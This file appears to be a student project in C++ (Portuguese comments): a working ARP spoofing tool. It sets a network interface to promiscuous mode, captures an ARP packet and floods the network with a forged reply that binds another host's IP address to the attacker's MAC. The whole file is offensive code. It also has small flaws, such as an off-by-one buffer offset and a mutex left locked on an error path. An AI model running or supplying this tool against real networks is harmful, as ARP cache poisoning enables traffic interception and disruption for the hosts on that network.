#include <sys/types.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <arpa/inet.h>          // manipulação de endereços IP
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <net/if.h>             // ifr struct
#include <netinet/ether.h>      // header ethernet
#include <netinet/in.h>         // protocol definitions
#include <netinet/in_systm.h>   // tipos de dados (???)
#include <netpacket/packet.h>

#include <csignal>
#include <cstring>
#include <iostream>
#include <mutex>
#include <thread>

#include "colors.h"
#include "helpers.h"
#include "ethernet.h"
#include "arp.h"
#include "ip.h"

using namespace Colors;

void SIGINTHandler(int);

std::mutex runMutex;
int run = 1;

void attack(int socket, int ivalue, const Arp reply)
{
  Ethernet ethernet;
  memcpy(ethernet.destination, reply.targetHAddr, HLEN);
  memcpy(ethernet.source, reply.senderHAddr, HLEN);
  ethernet.etherType = 0x0806;

  int size = 0;
  BYTE buff[BUFFSIZE];
  size += ethernet.ToBuffer(&buff[0]);
  size += reply.ToBuffer(&buff[15]);

  std::cout << red << "Hello from thread ATTACK!" << reset << std::endl;
  std::cout << ethernet.ToString() << std::endl;
  std::cout << reply.ToString() << std::endl;

  struct sockaddr_ll destAddr;
  destAddr.sll_family = htons(PF_PACKET);
  destAddr.sll_protocol = htons(ETH_P_ALL);
  destAddr.sll_halen = HLEN;
  destAddr.sll_ifindex = ivalue;
  memcpy(&(destAddr.sll_addr), ethernet.destination, HLEN);
  
  while (run)
  {
    runMutex.lock();
    int ret;
    if ((ret = sendto(socket, buff, size, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
			error();
			return;
    }
    runMutex.unlock();
  }
}

int main(int argc, char** argv)
{
  /*BYTE xxx[HLEN] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05 };
  BYTE yyy[HLEN] = { 0x10, 0x11, 0x12, 0x13, 0x14, 0x15 };
  BYTE www[PLEN] = { 0xFF, 0xFE, 0xFD, 0xFC };
  BYTE zzz[PLEN] = { 0xAA, 0xAB, 0xAC, 0xAD };

  Ethernet ethernet;
  memcpy(&ethernet.destination, &xxx, HLEN);
  memcpy(&ethernet.source, &yyy, HLEN);
  ethernet.etherType = 0x0806;

  Arp arpx;
  arpx.hType = 0x0102;
  arpx.pType = 0x0304;
  arpx.hLen  = 0x5;
  arpx.pLen = 0x06;
  arpx.operation = 0x0708;
  memcpy(&arpx.senderHAddr, &xxx, HLEN);
  memcpy(&arpx.senderPAddr, &www, PLEN);
  memcpy(&arpx.targetHAddr, &yyy, HLEN);
  memcpy(&arpx.targetPAddr, &zzz, PLEN);

  std::cout << ethernet.ToString() << std::endl << arpx.ToString() << std::endl;

  int size = 0;
  BYTE buffx[BUFFSIZE];
  size += ethernet.ToBuffer(&buffx[0]);
  size += arpx.ToBuffer(&buffx[size]);

  for (int i = 0; i < size; i++)
  {
    std::cout << "[" << std::hex << (int)buffx[i] << "]";
  }

  std::cout << std::endl;*/

  if (argc != 2)
  {
    std::cerr << "Usage: spoofer <interface>" << std::endl;
    exit(-1); 
  }

  BYTE intMac[HLEN];
  BYTE intIp[PLEN];
  std::thread* attackThread = nullptr;

  std::cout << "Capture SIGINT...";

  if (signal(SIGINT, SIGINTHandler) == SIG_ERR)
  {
    error();
    exit(-1);
  }

  ok();
  std::cout << "Create socket...";

  int sockd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (sockd < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok(); 
  std::cout << "Retrieve interface index...";

  struct ifreq ifr;
	strcpy(ifr.ifr_name, argv[1]);

	if (ioctl(sockd, SIOCGIFINDEX, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok();
  std::cout << "Retrieve interface hardware address...";

  if (ioctl(sockd, SIOCGIFHWADDR, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  MakeMAC((BYTE*)&ifr.ifr_hwaddr.sa_data[0], &intMac[0]);

  ok();
  std::cout << "Retrieve interface protocol address...";

  if (ioctl(sockd, SIOCGIFADDR, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  MakeIP((BYTE*)&ifr.ifr_addr.sa_data[2], &intIp[0]);

  ok();
  std::cout << "Retrieve interface flags... ";

	if (ioctl(sockd, SIOCGIFFLAGS, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok();
  std::cout << "Set interface to PROMISCUOUS mode... ";

	ifr.ifr_flags |= IFF_PROMISC;

	if (ioctl(sockd, SIOCSIFFLAGS, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok();
  std::cout << std::endl << blue << "Capturing interface " << ifr.ifr_name << " (" << MACToStr(intMac) << " :: " << IPToStr(intIp) << ")..." << reset << std::endl;
 
	BYTE buff[BUFFSIZE];

  while (run) 
  {
    recv(sockd, (char *) &buff, sizeof(buff), 0x00);

    Ethernet ethernet(&buff[0]);

    if (ethernet.etherType == P_ARP)
    {
      Arp arp(&buff[14]);

      //if (arp.operation == 1 && !CompareIP(arp.targetPAddr, intIp))
      {
        std::cout << blue << "Received ARP Request:" << reset << std::endl << arp.ToString() << std::endl;

        Arp reply = arp;
        reply.operation = 2;

        memcpy(reply.targetHAddr, reply.senderHAddr, HLEN);
        memcpy(reply.senderHAddr, intMac, HLEN);

        BYTE ipSwap[PLEN];

        memcpy(ipSwap, reply.targetPAddr, PLEN);
        memcpy(reply.targetPAddr, reply.senderPAddr, PLEN);
        memcpy(reply.senderPAddr, ipSwap, PLEN);

        attackThread = new std::thread(attack, sockd, ifr.ifr_ifindex, reply);
        break;
      }
    }
	}

  if (attackThread != nullptr)
  {
    std::cout << yellow << "Waiting for attack thread to terminate..." << reset << std::endl;
    attackThread->join();
  }

	ifr.ifr_flags &= ~IFF_PROMISC;  
  std::cout << "Unset interface from PROMISCUOUS mode...";

  if (ioctl(sockd, SIOCSIFFLAGS, &ifr) < 0)
  {
    error();
    close(sockd);
    exit(-1);
  }

  ok();
  close(sockd);

  return 0;
}

void SIGINTHandler(int sig)
{
  std::cout << yellow << "Received signal to interrupt execution. Terminating...\n\n" << reset;
  runMutex.lock();
  run = 0;
  runMutex.unlock();
}

